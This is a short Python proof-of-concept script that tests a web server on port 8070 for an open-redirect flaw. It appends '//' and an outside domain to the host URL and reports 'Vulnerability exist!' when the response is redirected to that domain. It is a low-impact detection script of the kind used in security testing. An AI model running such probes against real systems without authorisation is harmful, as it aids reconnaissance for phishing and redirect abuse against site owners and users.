# coding=utf-8
"""
DATE:   2021/6/29
AUTHOR: TesterCC
"""

import requests

host = 'http://x.x.x.x:8070'
jump_domain = 'www.ip138.com'

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36'
}

if not jump_domain.startswith("www"):
    raise Exception("Format error!")
elif jump_domain.endswith('/'):
    jump_domain = jump_domain.replace('/','')

target_url = host +'//'+ jump_domain
print("Visit URL: ", target_url)
response = requests.get(target_url,timeout=7, headers=headers)
print(response.status_code)

if jump_domain in response.url:
    print("Vulnerability exist!")

else:
    print("Can't use this weapon.")

# print(response.text)